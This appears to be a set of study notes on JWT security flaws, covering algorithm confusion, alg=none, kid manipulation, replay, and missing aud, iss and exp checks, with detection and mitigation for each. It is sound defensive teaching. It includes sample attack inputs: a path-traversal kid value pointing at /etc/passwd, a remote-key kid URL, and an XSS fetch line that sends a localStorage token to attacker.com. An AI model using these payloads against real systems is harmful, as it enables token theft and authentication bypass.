JSON Web Token (JWT) is simply a signed token used to prove identity and carry claims between systems.
-> Structure:
HEADER.PAYLOAD.SIGNATURE
Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyIjoiZGlwaWthbnRhIiwicm9sZSI6InVzZXIifQ.
signature
	• Header → signing algorithm
	• Payload → claims (user, role, expiry)
	• Signature → cryptographic integrity protection

Servers verify the signature before trusting the payload.
Most JWT vulnerabilities happen because developers trust the payload before verifying it properly or misconfigure the verification logic.

1. Why is trusting JWT claims before verifying the signature a critical vulnerability?
-> How JWT verification SHOULD work:
Correct flow:
Receive JWT
      ↓
Verify signature
      ↓
Check expiration
      ↓
Trust claims

Example token:
{
 "user": "alice",
 "role": "admin"
}
If the signature is valid, the server trusts the payload.

-> The common mistake:
Some applications decode the token before verifying the signature.
Example code (bad):
payload = jwt.decode(token, options={"verify_signature": False})
if payload["role"] == "admin":
    allow_admin()

Now the attacker can modify the payload.
Original token:
role=user
Attacker changes it to:
role=admin
Since verification is disabled, the application trusts the modified claim.

⚙️ How it actually works (internals)
A JWT is:
HEADER.PAYLOAD.SIGNATURE
Example:
HEADER:  {"alg":"HS256"}
PAYLOAD: {"user":"alice","role":"user"}
SIGNATURE: HMAC(secret, header + payload)
Important truth:
👉 The payload is NOT protected by default
👉 It is only protected if and after signature verification succeeds

-> What correct verification looks like internally:
1. Receive token
2. Recompute signature using server secret
3. Compare with token signature
4. If match → trust payload

-> What broken apps do:
1. Decode token
2. Read payload
3. Use role/permissions
4. (Maybe verify later or never)
This is the core bug.

💣 Exploitation (step-by-step):
Original token:
{"user":"alice","role":"user"}
Attacker modifies:
{"user":"alice","role":"admin"}
Signature is now invalid.
BUT…
If app does:
payload = decode(token, verify=False)
if payload["role"] == "admin":
    grant_access()
👉 You just got admin without any key.

🔍 Detection:
You look for:
	• Libraries used with verify=False
	• Manual base64 decoding
	• Access decisions before verification
Runtime sign:
👉 Tampered token still works

🛡️ Mitigation:
	• Always use safe library defaults
	• Never manually decode before verify
	• Reject token if verification fails

2. What is the "alg=none" vulnerability and why was it historically dangerous?
This is one of the most famous JWT issues.
-> How JWT algorithms work:
The header defines the signing algorithm.
Example:
{
 "alg": "HS256",
 "typ": "JWT"
}
The server verifies the signature using HS256.

⚙️ How it works internally
JWT libraries historically supported:

Signed tokens
Unsigned tokens

So they allowed:
HEADER: {"alg":"none"}
PAYLOAD: {"user":"admin"}
SIGNATURE: (empty)

-> Attack flow:
Attacker takes a valid token:
HEADER: {"alg":"HS256"}
PAYLOAD: {"user":"bob","role":"user"}
SIGNATURE: valid

They modify it to:
HEADER: {"alg":"none"}
PAYLOAD: {"user":"bob","role":"admin"}
SIGNATURE: (removed)
If the server allows alg=none, it skips verification.
Now the attacker becomes admin.

-> Why this happened:
Developers relied on the algorithm defined inside the token, which is attacker-controlled.

-> Correct mitigation:
• Never trust the token header.
• Hardcode allowed algorithms server-side
allowed_algorithms = ["RS256"]
• Disable none

3. What is the RSA → HMAC key confusion attack?
-> It happens when applications support both symmetric and asymmetric algorithms.
Two common algorithms:
• HS256 (HMAC)
shared_secret
Both sign and verify use the same secret.

• RS256 (RSA)
Private key → sign
Public key  → verify
Public key can be shared.

-> The vulnerability:
If a server supports both algorithms, confusion can occur.
Example configuration:
allowed_algorithms = ["HS256","RS256"]
Verification code:
jwt.verify(token, public_key)

-> Attack flow:
	1. Attacker obtains the public key (which is public).
	2. They create a token:
HEADER: {"alg":"HS256"}
	3. They sign the token using the public key as the HMAC secret.
HMAC(public_key, payload)
	4. Server verifies it using the same public key.
The signature appears valid.

-> Why this works:
Because the server uses:
verify(token, public_key)
Without checking the algorithm.
So the public key is incorrectly used as an HMAC secret.

-> Impact:
Attacker can generate valid tokens for any user.
This is full authentication bypass.

-> Mitigation:
• Never allow mixed algorithms.
• Use strict configuration:
allowed_algorithms = ["RS256"]
• And verify using a proper library.

4. Why is accepting attacker-controlled kid headers dangerous?
The kid (key ID) header tells the server which key to use.
Example:
{
 "alg": "RS256",
 "kid": "key1"
}
The server uses it to select a key from a key store.
key = keystore[kid]
verify(token, key)

The attacker manipulates the kid field to control which key the server loads.

💣 Exploitation paths:
If the kid value is not validated, attackers can manipulate it.
Attack 1: Path traversal:
kid = "../../../../etc/passwd"
Server loads system file as key.
This becomes **Path Traversal via JWT.

Attack 2: Remote key injection:
Some systems fetch keys remotely.
kid = "https://attacker.com/key"
Server downloads attacker key.
Attacker signs tokens with their own key and the server trusts them.

Attack 3: Null byte / injection:
Manipulate parsing logic to bypass checks.

🔍 Detection:
	• Fuzz kid parameter
	• Try file paths, URLs
	• Observe server behavior

🛡️ Mitigation:
	• Only allow predefined keys
		if kid not in keystore:
	    reject
	• No dynamic lookup
	• No filesystem access based on kid
	• Strictly validate kid.
	• Never fetch remote keys based on token input.

5. Why is storing sensitive data inside JWT dangerous?
Many developers misuse JWT as a secure storage mechanism.
Example payload:
{
 "user": "alice",
 "email": "alice@company.com",
 "ssn": "123-45-6789"
}
They assume the data is protected.
But JWT payload is Base64 encoded, not encrypted.
Anyone can decode it.

Example:
Token:
eyJ1c2VyIjoiYWxpY2UifQ
Decoded:
{"user":"alice"}
Attackers can read everything.

-> Real risks:
Sensitive data exposure.
Examples seen in real systems:
	• passwords
	• API keys
	• internal system roles
	• email addresses
	• access scopes

-> Another subtle issue:
JWTs are often stored in:
localStorage
If the site has Cross‑Site Scripting (XSS), attackers steal tokens instantly.

-> Mitigation:
JWT payload should contain minimal claims.
Example:
• user_id
• token_id
• expiry
Sensitive data should be retrieved from the server.

7. Why is JWT replay a serious problem even when the signature is valid?
A replay attack happens when an attacker captures a valid JWT and reuses it later to impersonate the user.

⚙️ How JWT is supposed to work:
JWT is stateless.
Server does NOT store session.
Token itself proves identity.

So every request:
Client → Server (JWT)
Server → verifies signature → allows access

💣 Exploitation:
Imagine this scenario:
User logs in on public Wi-Fi
Attacker intercepts JWT (via:
• HTTP (no TLS)
• logs
• browser storage + XSS)
Now attacker has:
• valid JWT
• valid signature
• valid claims

They send:
Authorization: Bearer <stolen_token>

Server verifies:
✔ Signature valid
✔ Token not expired
👉 Access granted

Key realization:
JWT does NOT prove: Who is sending the request
It only proves: Token was issued by trusted authority

🔍 Detection:
Same token used from:
• multiple IPs
• different geographies
• unusual concurrent sessions

🛡️ Mitigation:
1. Short expiration
exp = 15 minutes
2. Token binding (advanced)
Bind token to:
device / TLS session / client cert
3. jti (token ID) tracking
Store token ID in DB
Reject reused tokens (for sensitive flows)
4. Refresh token rotation

Invalidate old tokens when new ones are issued.

JWT replay attacks occur because tokens are bearer credentials; possession equals authorization, so without binding or short lifetimes, stolen tokens remain valid.

7. Why is missing or weak aud (audience) validation dangerous?
The aud claim defines: Who the token is intended for

⚙️ How it works:
Example:
{
 "user": "alice",
 "aud": "payments-api"
}

💣 Exploitation:
Imagine:
Company has:
Service A → internal API
Service B → public API

Attacker gets token for:
aud = "service-A"
But Service B does NOT validate aud.
Attacker sends token to Service B.
👉 Service B accepts it.

🤯 Why this is dangerous?
Token issued for one system is used in another system.
This breaks:
Service isolation

🔍 Detection:
Check if services validate aud
Try using token across services

🛡️ Mitigation:
Each service must:
if token.aud != expected:
    reject

In microservices:JWT flows across services.
Without aud, tokens become universal passports.
Audience validation ensures tokens are used only by intended services; without it, tokens can be replayed across trust boundaries.

8. Why is improper expiration (exp) and clock skew handling risky?
JWT expiration controls how long a token is valid.

⚙️ How it works
{
 "exp": 1700000000
}

Server checks:
current_time < exp

💣 Exploitation scenarios:
Scenario 1: No expiration:
Token valid forever
If leaked → permanent compromise

Scenario 2: Long expiration:
exp = 30 days
Attacker has huge window

Scenario 3: Clock skew abuse:
Servers allow:
±5 minutes tolerance
Attacker uses expired token within skew window.

🤯 Subtle issue:
Some systems:
Ignore exp if parsing fails

🔍 Detection:
• Tokens without exp
• Very long lifetimes
• inconsistent time validation

🛡️ Mitigation:
Always require exp
Keep it short (minutes, not days)
Use nbf (not before)

Expiration is the only built-in revocation mechanism in JWT, so improper handling directly increases attack window.

9. Why is improper issuer (iss) validation dangerous?
iss defines: Who issued the token

⚙️ Example
{
 "iss": "https://auth.company.com"
}

💣 Exploitation:
Imagine your system trusts tokens from:
auth.company.com
But does NOT validate iss.

Attacker creates token from:
https://evil.com
Signs it with their own key.

If server skips issuer check:
👉 Token is accepted

🤯 Why this happens:
Developers only check:
signature is valid
But forget:
👉 valid according to WHOM?

🔍 Detection:
Try tokens from different issuers
Check if system rejects them

🛡️ Mitigation:
Strict check:
if token.iss != trusted_issuer:
    reject

Signature validation without issuer validation can lead to trusting tokens from untrusted identity providers.

10. Why is storing JWT in localStorage dangerous?
JWT stored in:
localStorage
is accessible via JavaScript.

⚙️ How it works:
localStorage.getItem("token")

💣 Exploitation:
If application has:
👉 Cross-Site Scripting (XSS)
Attacker injects:
fetch("https://attacker.com?token=" + localStorage.token)
Now attacker has JWT.

🤯 Why this is severe:
JWT = authentication
So stealing it = full account takeover

🔍 Detection:
Check storage mechanism
Test XSS
Observe token exfiltration

🛡️ Mitigation:
Use:
HttpOnly cookies
Why?
JS cannot access cookies
Also:
Secure flag
SameSite


🧠 Final Pattern (this is what will stay with you)
These 5 introduce new dimensions beyond crypto:

1. Replay & lifecycle issues
→ JWT is reusable

2. Context validation failures
→ aud, iss missing

3. Time-based weaknesses
→ exp misused

4. Storage layer vulnerabilities
→ localStorage + XSS

->The deep mental model (this is what interviewers want)
JWT problems usually come from three architectural mistakes:
1. Trusting client-controlled data:
The header and payload are attacker-controlled inputs.
2. Misconfigured cryptography:
Algorithm confusion and key misuse break signature verification.
3. Treating JWT like secure storage:
JWT is a transport container, not a database.

6.Where does the “server secret” come from?
The secret is NOT inside the JWT.
👉 It is pre-configured on the server.
Think of it like this:

JWT = message
Secret = password known only to server
Signature = proof message was created using that password

🏗️ There are TWO real-world cases:
Case 1: Your own application issues JWT (HS256):
This is the simplest case.
🔐 Where does the secret come from?
The server defines it.
Example:
SECRET_KEY = "my_super_secret_123"
This is stored in:
• environment variables
• secrets manager (AWS Secrets Manager, Vault)
• config files (not recommended)

⚙️ Token creation (Login flow):
User logs in:
User → Server: username/password
Server verifies credentials, then creates JWT:
token = jwt.sign(
  payload={"user":"alice","role":"user"},
  secret=SECRET_KEY,
  algorithm="HS256"
)

🔐 What is signature here?
HMAC(secret, header + payload)
So:
signature = HMAC("my_super_secret_123", data)

⚙️ Verification later:
User sends request:
Authorization: Bearer <token>

Server does:
jwt.verify(token, SECRET_KEY)

Internally:
1. Extract header + payload
2. Recompute signature using SECRET_KEY
3. Compare with token signature

If match → token is valid.

👉 The same secret is used for:
• signing
• verification

That’s why it’s called symmetric crypto.

Case 2: External Identity Provider (RS256):
This is what happens in real systems (OAuth, SSO, Google login).

🔐 Who creates the token?
Not your app.
Example providers:
Google
Microsoft
Auth0

🔐 Where is the “secret” now?
There is NO shared secret.
Instead:
Private key → used by IdP to sign
Public key  → used by your server to verify

⚙️ Flow:
Step 1: User logs in via IdP
	User → Google login page
Step 2: IdP issues JWT
	JWT signed with PRIVATE KEY
Step 3: Your server verifies
	jwt.verify(token, public_key)

👉 Your server never knows the private key. It only has:
public key (downloaded from IdP)

🔍 Where does public key come from?
From a standard endpoint:
https://idp.com/.well-known/jwks.json
This is called JWKS (JSON Web Key Set).


Most JWT vulnerabilities arise when applications trust attacker-controlled token fields such as alg, kid, or payload claims without enforcing strict server-side validation and cryptographic verification.
